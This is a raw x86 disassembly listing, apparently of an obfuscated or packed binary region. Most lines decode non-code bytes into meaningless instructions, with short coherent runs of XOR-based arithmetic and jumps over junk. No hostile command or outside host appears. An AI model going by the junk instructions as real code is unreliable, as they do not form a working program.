  40bcf0:	cmp    cl,BYTE PTR ds:0x541357be
  40bcf6:	jmp    0xf642:0xfe42a131
  40bcfd:	lds    esp,FWORD PTR [edx]
  40bcff:	shl    DWORD PTR [ecx],1
  40bd01:	add    DWORD PTR [ecx+0x5c443f53],eax
  40bd07:	adc    eax,0xc0554d7b
  40bd0c:	inc    ecx
  40bd0d:	inc    esi
  40bd0e:	(bad)  
  40bd0f:	jmp    0x9940076a
  40bd14:	in     eax,dx
  40bd15:	popa   
  40bd16:	adc    al,0xd1
  40bd18:	int    0xf8
  40bd1a:	in     eax,0x45
  40bd1c:	add    al,0x8f
  40bd1e:	test   edx,esi
  40bd20:	shl    BYTE PTR [esi],cl
  40bd22:	xchg   ebp,eax
  40bd23:	adc    edi,ebx
  40bd25:	cmp    eax,0x93c3f963
  40bd2a:	cmp    ebp,DWORD PTR [edi+0x7c]
  40bd2d:	jecxz  0x40bd13
  40bd2f:	lds    ebp,FWORD PTR [edi]
  40bd31:	add    DWORD PTR [ecx-0x73],0x5aa30124
  40bd38:	repz sub BYTE PTR [ecx-0x13667cd],bl
  40bd3f:	ds or  eax,0x1d61a03f
  40bd45:	pusha  
  40bd46:	or     al,0xd1
  40bd48:	repz test eax,0x4519e091
  40bd4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd50:	xor    DWORD PTR [eax-0x41],esp
  40bd53:	pop    ebp
  40bd54:	test   DWORD PTR ds:[edx],0xc90ca518
  40bd5b:	mov    bh,bh
  40bd5d:	in     al,0x96
  40bd5f:	mov    ebp,0x2717f721
  40bd64:	mov    eax,0x3f18a80f
  40bd69:	mov    eax,DWORD PTR [edx]
  40bd6b:	addr16 addr16 push ds
  40bd6e:	nop
  40bd6f:	jb     0x40bd22
  40bd71:	push   0x27
  40bd73:	test   BYTE PTR [edi],dl
  40bd75:	and    ebx,DWORD PTR [ebx]
  40bd77:	mov    dh,0x3e
  40bd79:	or     DWORD PTR [edx+0x8],ebp
  40bd7c:	ror    DWORD PTR [ebx-0x23],0x1d
  40bd80:	xchg   esp,eax
  40bd81:	jl     0x40bdd7
  40bd83:	sar    BYTE PTR [edx+0x2c],1
  40bd86:	xor    al,0x65
  40bd88:	jge    0x40bd2c
  40bd8a:	cmp    DWORD PTR [eax-0x579f3d19],esi
  40bd90:	ds xchg ebp,eax
  40bd92:	and    BYTE PTR [ebx+ebp*4+0x0],dh
  40bd96:	shufps xmm2,XMMWORD PTR [ebx],0xc1
  40bd9a:	popa   
  40bd9b:	loopne 0x40bd7f
  40bd9d:	loope  0x40bdc0
  40bd9f:	clc    
  40bda0:	daa    
  40bda1:	cmp    eax,0x8a922d50
  40bda6:	and    BYTE PTR [eax-0x46],0x63
  40bdaa:	cmp    eax,0x6bce10ed
  40bdaf:	and    DWORD PTR [ecx-0x7fe693a],edx
  40bdb5:	lods   eax,DWORD PTR ds:[esi]
  40bdb6:	lods   eax,DWORD PTR ds:[esi]
  40bdb7:	xchg   esp,eax
  40bdb8:	xchg   esp,eax
  40bdb9:	jecxz  0x40bdea
  40bdbb:	jae    0x40bd44
  40bdbd:	xchg   esi,eax
  40bdbe:	ss icebp 
  40bdc0:	outs   dx,DWORD PTR ds:[esi]
  40bdc1:	iret   
  40bdc2:	mov    al,ds:0x2a26d8c8
  40bdc7:	sub    BYTE PTR [edx+0x52],bl
  40bdca:	mov    al,0x89
  40bdcc:	jmp    0x7977878f
  40bdd1:	push   esi
  40bdd2:	inc    DWORD PTR [ebp-0x266f7533]
  40bdd8:	popf   
  40bdd9:	xchg   bh,bh
  40bddb:	aas    
  40bddc:	nop
  40bddd:	sub    al,0x3f
  40bddf:	xor    eax,0xb04bd209
  40bde4:	loope  0x40be54
  40bde6:	inc    edi
  40bde7:	cmp    dh,cl
  40bde9:	out    dx,al
  40bdea:	ja     0x40bdb5
  40bdec:	adc    eax,0xc49e63ec
  40bdf1:	mov    esi,0x9d0d1ad
  40bdf6:	and    BYTE PTR [esi-0x38],bh
  40bdf9:	push   esp
  40bdfa:	xor    eax,0x2f9c4a1b
  40bdff:	inc    esi
  40be00:	dec    ecx
  40be01:	mov    ah,0xd5
  40be03:	jl     0x40bd9a
  40be05:	sbb    esp,edx
  40be07:	jg     0x40be19
  40be09:	jp     0x40bdde
  40be0b:	adc    eax,0xd6e23b6b
  40be10:	fucomip st,st(7)
  40be12:	(bad)  
  40be13:	xlat   BYTE PTR ds:[ebx]
  40be14:	mov    eax,ebx
  40be16:	sar    ecx,0x6a
  40be19:	sub    ebx,DWORD PTR [ecx]
  40be1b:	aaa    
  40be1c:	cmp    BYTE PTR [esi+0x38],dl
  40be1f:	xchg   bh,ch
  40be21:	in     al,dx
  40be22:	or     al,0x86
  40be24:	xchg   esi,eax
  40be25:	imul   esi,edi,0xffffff9a
  40be28:	cdq    
  40be29:	inc    edi
  40be2a:	cmp    esp,0x3b
  40be2d:	xchg   cl,ah
  40be2f:	cmp    al,0x54
  40be31:	sbb    DWORD PTR [ecx-0x17c2960c],0xae69d80b
  40be3b:	mov    BYTE PTR ds:0xb9ff4aa1,cl
  40be41:	add    DWORD PTR [edi-0x77],esp
  40be44:	or     esp,ecx
  40be46:	retf   
  40be47:	adc    BYTE PTR [ebx-0x170ac6c9],0xe2
  40be4e:	dec    edx
  40be4f:	rcr    ebx,0xe0
  40be52:	imul   ecx,DWORD PTR ds:0x2bb4c97a,0xffffffe2
  40be59:	ja     0x40be6b
  40be5b:	cld    
  40be5c:	loopne 0x40be05
  40be5e:	test   al,0x37
  40be60:	or     dh,0xab
  40be63:	inc    ebx
  40be64:	sub    DWORD PTR [edi-0x1a],esi
  40be67:	out    dx,al
  40be68:	xchg   edi,eax
  40be69:	shl    BYTE PTR [edi],1
  40be6b:	out    0x97,al
  40be6d:	mov    dh,0x24
  40be6f:	jle    0x40beb9
  40be71:	xchg   edi,eax
  40be72:	das    
  40be73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be74:	neg    DWORD PTR [ecx]
  40be76:	sbb    edi,edi
  40be78:	lock and esp,ecx
  40be7b:	xchg   ebx,eax
  40be7c:	out    dx,al
  40be7d:	fst    st(2)
  40be7f:	cs scas eax,DWORD PTR es:[edi]
  40be81:	(bad)  [ebx+0x3321b0d8]
  40be88:	sub    eax,DWORD PTR [ebp+0x23]
  40be8b:	add    edi,DWORD PTR [edi]
  40be8d:	push   ecx
  40be8e:	jmp    FWORD PTR [edx]
  40be90:	mov    ch,0xde
  40be92:	fistp  DWORD PTR ds:0x988df57
  40be98:	pop    ebp
  40be99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be9a:	mov    ds:0x58d1c0f6,al
  40be9f:	sbb    DWORD PTR [edi-0x17],esp
  40bea2:	ins    DWORD PTR es:[edi],dx
  40bea3:	and    DWORD PTR [esi+0x32204301],edx
  40bea9:	into   
  40beaa:	fiadd  DWORD PTR [ebx-0x44]
  40bead:	dec    edx
  40beae:	clc    
  40beaf:	mov    dl,0x6b
  40beb1:	mov    ebp,0x22178c9
  40beb6:	ret    
  40beb7:	pop    ds
  40beb8:	xor    cl,ah
  40beba:	mov    bh,0xb9
  40bebc:	lods   al,BYTE PTR ds:[esi]
  40bebd:	test   BYTE PTR [edx],bl
  40bebf:	fs cmp al,0xa7
  40bec2:	stc    
  40bec3:	ds jnp 0x40be9f
  40bec6:	push   ecx
  40bec7:	or     edi,DWORD PTR [edx-0x7e618e1]
  40becd:	push   edx
  40bece:	cmc    
  40becf:	push   eax
  40bed0:	xor    bh,dh
  40bed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bed3:	mov    ds:0x68d9955f,eax
  40bed8:	adc    WORD PTR [ebx-0x7b],sp
  40bedc:	inc    ebp
  40bedd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bede:	mov    esi,0x6514ec3d
  40bee3:	dec    ebx
  40bee4:	or     ch,BYTE PTR [esi]
  40bee6:	xchg   esp,eax
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x6bf14931]
  40bf27:	or     al,BYTE PTR [eax+0x387e7ef9]
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf64
  40bf31:	pop    edx
  40bf32:	xchg   edi,eax
  40bf33:	sbb    edi,DWORD PTR [bp-0x6843]
  40bf38:	mov    ah,0xdf
  40bf3a:	daa    
  40bf3b:	sub    eax,0xdcec2e77
  40bf40:	dec    ecx
  40bf41:	cmp    bh,BYTE PTR [eax+0x49]
  40bf44:	jge    0x40beda
  40bf46:	out    dx,al
  40bf47:	inc    ecx
  40bf48:	mov    ch,0xf0
  40bf4a:	adc    dh,bl
  40bf4c:	in     eax,dx
  40bf4d:	mov    edx,es
  40bf4f:	dec    ecx
  40bf50:	out    dx,eax
  40bf51:	popf   
  40bf52:	push   esp
  40bf53:	push   edx
  40bf54:	dec    DWORD PTR [edx+0x3c]
  40bf57:	mov    esi,0x5ec1105
  40bf5c:	adc    esi,DWORD PTR [eax+ebx*2-0x5b1088f0]
  40bf63:	rcl    dh,1
  40bf65:	int3   
  40bf66:	push   0x78
  40bf68:	idiv   eax
  40bf6a:	jmp    0x40bf7b
  40bf6c:	mov    eax,0xa7a91cc1
  40bf71:	mov    ds:0xddb8faa7,eax
  40bf76:	jmp    DWORD PTR [ebx+eiz*4]
  40bf79:	xchg   esi,eax
  40bf7a:	loopne 0x40bf34
  40bf7c:	mov    ch,0x43
  40bf7e:	retf   0xaf60
  40bf81:	repnz fistp WORD PTR [eax]
  40bf84:	shl    ebp,1
  40bf86:	arpl   sp,bx
  40bf88:	ret    0xe8a8
  40bf8b:	sub    ch,BYTE PTR [ecx+0x63911648]
  40bf91:	(bad)  {k1}{z}
  40bf96:	mov    DWORD PTR [ecx+0xa],ebx
  40bf99:	push   cs
  40bf9a:	ficom  DWORD PTR [eax-0x19]
  40bf9d:	fwait
  40bf9e:	cmp    al,0x5e
  40bfa0:	ror    dh,1
  40bfa2:	jae    0x40c019
  40bfa4:	ja     0x40bfb1
  40bfa6:	mov    dh,0x65
  40bfa8:	sub    eax,0x21646e79
  40bfad:	jb     0x40bfaa
  40bfaf:	test   eax,0xe0f4dd47
  40bfb4:	cmp    eax,0xc329f47f
  40bfb9:	lahf   
  40bfba:	or     DWORD PTR [ecx],ebx
  40bfbc:	ja     0x40bff2
  40bfbe:	mov    DWORD PTR [esi-0x24],ebx
  40bfc1:	ins    BYTE PTR es:[edi],dx
  40bfc2:	sub    DWORD PTR ds:0xc433be9d,0xffffffd3
  40bfc9:	pop    eax
  40bfca:	jne    0x40bfb0
  40bfcc:	adc    DWORD PTR [ecx+0x5a],edi
  40bfcf:	mov    cl,0xaf
  40bfd1:	gs dec eax
  40bfd3:	xor    eax,0xd7275f82
  40bfd8:	das    
  40bfd9:	enter  0x8eb4,0x27
  40bfdd:	dec    ebx
  40bfde:	cli    
  40bfdf:	loopne 0x40bf81
  40bfe1:	iret   
  40bfe2:	dec    edi
  40bfe3:	sub    al,BYTE PTR gs:[ebx+0x72]
  40bfe7:	and    esp,ebp
  40bfe9:	xchg   ecx,edi
  40bfeb:	out    dx,eax
  40bfec:	ins    DWORD PTR es:[edi],dx
  40bfed:	adc    BYTE PTR [edi],dl
  40bfef:	in     eax,0x7b
  40bff1:	ja     0x40c052
  40bff3:	call   0x62481b45
  40bff8:	adc    BYTE PTR [eax-0x3b],dl
  40bffb:	xlat   BYTE PTR ds:[ebx]
  40bffc:	mov    ch,0x4f
  40bffe:	mov    ebp,0x7925414c
  40c003:	and    al,BYTE PTR [ebx]
  40c005:	or     eax,0x45ef0c52
  40c00a:	push   eax
  40c00b:	sbb    al,BYTE PTR [edx-0x300effed]
  40c011:	cdq    
  40c012:	mov    ch,0x7c
  40c014:	jbe    0x40bf9e
  40c016:	and    eax,0xf0e85204
  40c01b:	arpl   WORD PTR [ebx-0x3f8b7156],bp
  40c021:	lods   eax,DWORD PTR ds:[esi]
  40c022:	leave  
  40c023:	in     al,dx
  40c024:	call   0xb1c7:0x318aff6c
  40c02b:	enter  0x179c,0xb8
  40c02f:	mov    bl,0x91
  40c031:	and    ebx,DWORD PTR [ebp-0x5ea031fc]
  40c037:	ss aas 
  40c039:	adc    BYTE PTR [edi+0x17],0x7f
  40c03d:	mov    edi,0xc9712b6e
  40c042:	mov    esi,0x2ef03ed8
  40c047:	inc    ebp
  40c048:	add    BYTE PTR [edi+0x6b42880f],ah
  40c04e:	xchg   esi,eax
  40c04f:	stos   DWORD PTR es:[edi],eax
  40c050:	cdq    
  40c051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c052:	inc    edx
  40c053:	add    DWORD PTR [ebx-0x36a66a2],esi
  40c059:	mov    esi,DWORD PTR [ecx+0x25]
  40c05c:	xchg   DWORD PTR [ebp+0x25],esi
  40c05f:	and    al,BYTE PTR [edx-0x78]
  40c062:	sahf   
  40c063:	push   eax
  40c064:	dec    eax
  40c065:	fwait
  40c066:	loope  0x40c0c4
  40c068:	btc    DWORD PTR [esi-0x7944527f],0xd0
  40c070:	xor    edx,DWORD PTR [eax+0x1c]
  40c073:	mov    ch,0x94
  40c075:	call   0x4950d670
  40c07a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c07b:	call   0x52be:0x646a2ffe
  40c082:	fisttp DWORD PTR [ebx+0x21]
  40c085:	aaa    
  40c086:	ds cdq 
  40c088:	or     eax,0x18e63408
  40c08d:	push   ebp
  40c08e:	dec    edi
  40c08f:	push   ebx
  40c090:	jg     0x40c052
  40c092:	inc    ebp
  40c093:	add    ebx,0xffffff93
  40c096:	not    BYTE PTR [edi+0x77971cfc]
  40c09c:	call   0x47cff647
  40c0a1:	xor    BYTE PTR [ebx],0x88
  40c0a4:	and    eax,0xf55bbbd7
  40c0a9:	stos   DWORD PTR es:[edi],eax
  40c0aa:	push   ss
  40c0ab:	mov    ebx,0x8c998189
  40c0b0:	cld    
  40c0b1:	and    ch,BYTE PTR [ebp+0x6e]
  40c0b4:	test   dl,bh
  40c0b6:	cli    
  40c0b7:	sbb    edi,DWORD PTR [edx-0x68d9ec7b]
  40c0bd:	mov    ah,0xb
  40c0bf:	add    DWORD PTR [esi+0x69],edx
  40c0c2:	jmp    0x2452fc5
  40c0c7:	add    al,0xd4
  40c0c9:	mov    ch,0x19
  40c0cb:	pop    edi
  40c0cc:	or     eax,eax
  40c0ce:	sbb    bh,bl
  40c0d0:	mov    DWORD PTR [ebx+0x58],esi
  40c0d3:	in     eax,dx
  40c0d4:	out    0xa6,al
  40c0d6:	sahf   
  40c0d7:	fild   DWORD PTR [ebx-0x3e]
  40c0da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0db:	pusha  
  40c0dc:	imul   esp,DWORD PTR [ebx],0xcdb49039
  40c0e2:	int3   
  40c0e3:	bound  edx,QWORD PTR [ecx+edi*2-0xc]
  40c0e7:	mov    ebp,0x9f1435e
  40c0ec:	xor    al,0x2d
  40c0ee:	sub    eax,0xe0d96c97
  40c0f3:	daa    
  40c0f4:	or     DWORD PTR [ebx+0x4db4baec],ebx
  40c0fa:	icebp  
  40c0fb:	shl    BYTE PTR [eax-0x3e],cl
  40c0fe:	jecxz  0x40c088
  40c100:	rol    DWORD PTR [edi],0xb8
  40c103:	mov    ebx,DWORD PTR [ecx]
  40c105:	cwde   
  40c106:	not    esi
  40c108:	sub    bl,BYTE PTR [ecx-0x4f]
  40c10b:	jae    0x40c0e0
  40c10d:	(bad)  
  40c10e:	mov    eax,ds:0xe8415cd8
  40c113:	stos   DWORD PTR es:[edi],eax
  40c114:	sub    al,0x4a
  40c116:	aas    
  40c117:	shl    DWORD PTR [edx-0x3c85b12d],cl
  40c11d:	in     eax,dx
  40c11e:	shl    BYTE PTR [ecx+0xe],1
  40c121:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40c123:	mov    dl,0x24
  40c125:	lds    ebx,FWORD PTR [ebp+0x511e7108]
  40c12b:	push   ds
  40c12c:	ss loope 0x40c0ba
  40c12f:	sub    cl,ch
  40c131:	dec    eax
  40c132:	or     bl,cl
  40c134:	add    bh,dh
  40c136:	pop    es
  40c137:	add    eax,0xf429636
  40c13c:	in     eax,dx
  40c13d:	xchg   BYTE PTR [ebx+0x46],bl
  40c140:	nop
  40c141:	adc    esi,eax
  40c143:	data16 sahf 
  40c145:	mov    ch,0x8a
  40c147:	sub    eax,0x109d0755
  40c14c:	jp     0x40c186
  40c14e:	aad    0x4c
  40c150:	and    eax,0x4d5a5fac
  40c155:	pop    eax
  40c156:	dec    ebp
  40c157:	(bad)  
  40c158:	loop   0x40c18b
  40c15a:	cwde   
  40c15b:	loop   0x40c0ef
  40c15d:	jbe    0x40c106
  40c15f:	inc    ebp
  40c160:	or     al,0x7e
  40c162:	les    esi,FWORD PTR [edi]
  40c164:	test   BYTE PTR [esi-0x3a],dh
  40c167:	or     bh,ah
  40c169:	ja     0x40c118
  40c16b:	add    DWORD PTR [ebx],ebx
  40c16d:	mov    ebp,DWORD PTR [ebp+0x6a]
  40c170:	ja     0x40c1a3
  40c172:	and    edx,edi
  40c174:	sti    
  40c175:	int    0x87
  40c177:	retf   
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x93
  40c196:	mov    dh,0x92
  40c198:	stc    
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	mov    esp,0x61365454
  40c1a6:	std    
  40c1a7:	and    ecx,DWORD PTR [edx]
  40c1a9:	sbb    esi,DWORD PTR [esi+0x6f]
  40c1ac:	cmp    al,0xbf
  40c1ae:	xchg   ebp,eax
  40c1af:	sub    eax,0xac693500
  40c1b4:	fs loop 0x40c15d
  40c1b7:	mov    BYTE PTR [edx+eiz*2],ch
  40c1ba:	jnp    0x40c179
  40c1bc:	std    
  40c1bd:	gs cld 
  40c1bf:	shl    al,0x99
  40c1c2:	lods   al,BYTE PTR ds:[esi]
  40c1c3:	sub    DWORD PTR [ebx],edi
  40c1c5:	icebp  
  40c1c6:	xchg   esp,eax
  40c1c7:	jmp    0x7a6c3ae0
  40c1cc:	std    
  40c1cd:	call   0x91a0e2aa
  40c1d2:	jmp    0x268c:0x1a4072f3
  40c1d9:	fidiv  WORD PTR [edi+0x38]
  40c1dc:	je     0x40c243
  40c1de:	push   esp
  40c1df:	fs mov dh,0x7b
  40c1e2:	dec    edi
  40c1e3:	mov    bh,0x8e
  40c1e5:	int    0x5f
  40c1e7:	enter  0x869d,0xf8
  40c1eb:	or     al,0x93
  40c1ed:	xor    bl,BYTE PTR [ebx]
  40c1ef:	push   esi
  40c1f0:	push   0x713b4894
  40c1f5:	iret   
  40c1f6:	or     eax,0xe225d22e
  40c1fb:	scas   eax,DWORD PTR es:[edi]
  40c1fc:	and    bl,BYTE PTR gs:[ecx+0x1c]
  40c200:	and    al,0xe1
  40c202:	xor    al,0x2f
  40c204:	cmp    al,0xbf
  40c206:	fst    QWORD PTR [edi+0x7f778c4a]
  40c20c:	fistp  DWORD PTR [edx+ebp*8]
  40c20f:	and    al,0xc1
  40c211:	adc    DWORD PTR [edi],esi
  40c213:	sbb    esp,DWORD PTR [ebp+ebp*1-0x2da5cee3]
  40c21a:	enter  0x8127,0x7a
  40c21e:	jmp    0x18f361ea
  40c223:	pop    ds
  40c224:	in     al,0x4c
  40c226:	push   ebp
  40c227:	pop    es
  40c228:	test   BYTE PTR [esi-0x352a40ba],dh
  40c22e:	enter  0x808c,0xdc
  40c232:	cmp    esp,DWORD PTR [eax]
  40c234:	into   
  40c235:	(bad)  
  40c236:	jge    0x40c20a
  40c238:	ret    0x1c74
  40c23b:	pop    eax
  40c23c:	pop    ecx
  40c23d:	push   ds
  40c23e:	fcomp  QWORD PTR [ecx-0x61]
  40c241:	mul    BYTE PTR [eax-0x420fcc38]
  40c247:	in     eax,0xe7
  40c249:	aad    0x8a
  40c24b:	nop
  40c24c:	imul   esi,ebp,0xffffffbc
  40c24f:	adc    bh,ch
  40c251:	xchg   esp,eax
  40c252:	test   DWORD PTR [edx+0x3e0aed44],esp
  40c258:	ror    DWORD PTR [ecx-0x6c972744],1
  40c25e:	add    edi,DWORD PTR ds:0xcf86c021
  40c264:	fpatan 
  40c266:	mov    ds:0x7096ee64,eax
  40c26b:	arpl   WORD PTR [ebp-0x79c5091b],cx
  40c271:	sbb    BYTE PTR [edi+0x10],ah
  40c274:	pushf  
  40c275:	loope  0x40c235
  40c277:	aad    0x7b
  40c279:	sar    BYTE PTR [edi+ebx*1-0x2f],0xe1
  40c27e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c27f:	(bad)  
  40c280:	pop    edi
  40c281:	jp     0x40c2d8
  40c283:	call   0x5f6a:0x92c5c899
  40c28a:	hlt    
  40c28b:	(bad)  
  40c28d:	inc    esp
  40c28e:	sahf   
  40c28f:	test   eax,0xb8656c31
  40c294:	and    eax,0xb0268d15
  40c299:	retf   
  40c29a:	jecxz  0x40c318
  40c29c:	mov    dh,0xd9
  40c29e:	inc    ebp
  40c29f:	popf   
  40c2a0:	jno    0x40c23d
  40c2a2:	sti    
  40c2a3:	aam    0x3d
  40c2a5:	mov    dl,0x5d
  40c2a8:	jbe    0x40c319
  40c2aa:	retf   
  40c2ab:	(bad)  
  40c2ac:	fnstcw WORD PTR [ebp+ebp*1+0x4e1af3a]
  40c2b3:	sub    BYTE PTR [edx-0x1393a1a5],dh
  40c2b9:	bound  ecx,QWORD PTR [esi+ecx*8+0x112fcd9f]
  40c2c0:	mov    ebp,0x511184a2
  40c2c5:	dec    ebx
  40c2c6:	call   0x1d3b:0x1dbd519a
  40c2cd:	xchg   esp,eax
  40c2ce:	inc    ecx
  40c2cf:	add    al,0x61
  40c2d1:	pusha  
  40c2d2:	push   esp
  40c2d3:	cmp    BYTE PTR [esi+eax*4],bl
  40c2d6:	mov    ds:0xeac03ca2,eax
  40c2db:	cmc    
  40c2dc:	(bad)  
  40c2de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2df:	loop   0x40c266
  40c2e1:	je     0x40c305
  40c2e3:	imul   edi,DWORD PTR [edx],0xddc41355
  40c2e9:	add    ebx,edx
  40c2eb:	mov    ebx,0x611dc006
  40c2f0:	mov    eax,ds:0xfba20143
  40c2f5:	scas   al,BYTE PTR es:[edi]
  40c2f6:	stos   DWORD PTR es:[edi],eax
  40c2f7:	fistp  DWORD PTR [edi-0x46]
  40c2fa:	ret    0xff73
  40c2fd:	out    0x10,al
  40c2ff:	mov    cl,BYTE PTR [ecx]
  40c301:	ins    DWORD PTR es:[edi],dx
  40c302:	pop    edi
  40c303:	xor    esp,edi
  40c305:	les    esi,FWORD PTR [ebx+ebx*4]
  40c308:	shr    BYTE PTR [eax],0x71
  40c30b:	mov    WORD PTR [ebp+0x59],cs
  40c30e:	int3   
  40c30f:	mov    BYTE PTR [esi],ah
  40c311:	sbb    ecx,esi
  40c313:	fdivr  QWORD PTR [edx+edx*2]
  40c316:	jecxz  0x40c389
  40c318:	fisubr DWORD PTR [esi-0x16a19544]
  40c31e:	fst    QWORD PTR [edi-0x1e]
  40c321:	mov    DWORD PTR [edi],ebx
  40c323:	xor    DWORD PTR [eax+eiz*1-0x697fd330],edi
  40c32a:	mov    ah,0xfc
  40c32c:	pop    ds
  40c32d:	mov    ch,ch
  40c32f:	sbb    al,0x1d
  40c331:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c333:	mov    ah,0x96
  40c335:	sar    BYTE PTR [eax+0x30ef58fd],0xb2
  40c33c:	or     esp,DWORD PTR [edi]
  40c33e:	jne    0x40c322
  40c340:	push   ecx
  40c341:	mov    ch,BYTE PTR ds:0xfdbfda7e
  40c347:	xchg   edx,eax
  40c348:	popf   
  40c349:	cld    
  40c34a:	push   0x854bc9f6
  40c34f:	push   ecx
  40c350:	jle    0x40c310
  40c352:	jb     0x40c31e
  40c354:	rcl    BYTE PTR [edi],cl
  40c356:	jnp    0x40c32d
  40c358:	mov    DWORD PTR [ecx-0x20],edx
  40c35b:	out    0x4f,eax
  40c35d:	das    
  40c35e:	jg     0x40c2f4
  40c360:	jo     0x40c380
  40c362:	or     ebx,DWORD PTR [ebx]
  40c364:	fist   WORD PTR [edx+0x525aebcf]
  40c36a:	fiadd  WORD PTR [esi]
  40c36c:	sub    eax,0x4c07b372
  40c371:	mov    esp,0x87e2fd83
  40c376:	ffreep st(3)
  40c378:	xor    edi,esi
  40c37a:	or     BYTE PTR [esi-0x7531fdf9],al
  40c380:	iret   
  40c381:	aaa    
  40c382:	in     al,dx
  40c383:	and    ch,dl
  40c385:	pop    edi
  40c386:	mov    esi,0x7c3a512a
  40c38b:	(bad)  
  40c38c:	lods   al,BYTE PTR ds:[esi]
  40c38d:	mov    ch,0x8
  40c38f:	jnp    0x40c322
  40c391:	out    dx,al
  40c392:	inc    esi
  40c393:	popa   
  40c394:	hlt    
  40c395:	(bad)  
  40c396:	push   es
  40c397:	leave  
  40c398:	aas    
  40c399:	sub    DWORD PTR [eax-0x6c],ebp
  40c39c:	dec    edx
  40c39d:	mov    al,0xf5
  40c39f:	jg     0x40c327
  40c3a1:	mov    ds:0x7dfda388,al
  40c3a6:	repz cmp al,0x7b
  40c3a9:	aas    
  40c3aa:	dec    ecx
  40c3ab:	push   eax
  40c3ac:	inc    eax
  40c3ad:	jle    0x40c3be
  40c3af:	adc    BYTE PTR [eax],0x35
  40c3b2:	lods   al,BYTE PTR ds:[esi]
  40c3b3:	push   ecx
  40c3b4:	jge    0x40c3f8
  40c3b6:	dec    eax
  40c3b7:	xchg   esi,eax
  40c3b8:	pop    edi
  40c3b9:	arpl   WORD PTR [ecx+0x52],di
  40c3bc:	test   eax,0xcd38d74d
  40c3c1:	or     DWORD PTR [ebx],esp
  40c3c3:	cmp    edi,DWORD PTR [eax+0x17]
  40c3c6:	fist   DWORD PTR [edi+0x150ac58b]
  40c3cc:	loopne 0x40c352
  40c3ce:	mov    ecx,DWORD PTR [ebp+0x49b799]
  40c3d4:	leave  
  40c3d5:	inc    ebx
  40c3d6:	push   cs
  40c3d7:	sbb    DWORD PTR [ebx+0x46],0xffffffe2
  40c3db:	(bad)  
  40c3dc:	stos   DWORD PTR es:[edi],eax
  40c3dd:	push   eax
  40c3de:	or     al,0x1e
  40c3e0:	sub    DWORD PTR [ebp-0x10c97af3],ebp
  40c3e6:	sub    ecx,DWORD PTR [ebx+0x54b9fc45]
  40c3ec:	or     BYTE PTR [ecx+0x7],dl
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rol    esp,cl
  40c447:	out    dx,eax
  40c448:	mov    dl,0xd2
  40c44a:	adc    al,0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	aaa    
  40c453:	cwde   
  40c454:	cmp    ebx,DWORD PTR [eax+edx*4+0x4d]
  40c458:	arpl   si,cx
  40c45a:	sub    bl,0x90
  40c45d:	icebp  
  40c45e:	adc    edi,ecx
  40c460:	int3   
  40c461:	add    eax,DWORD PTR [edi]
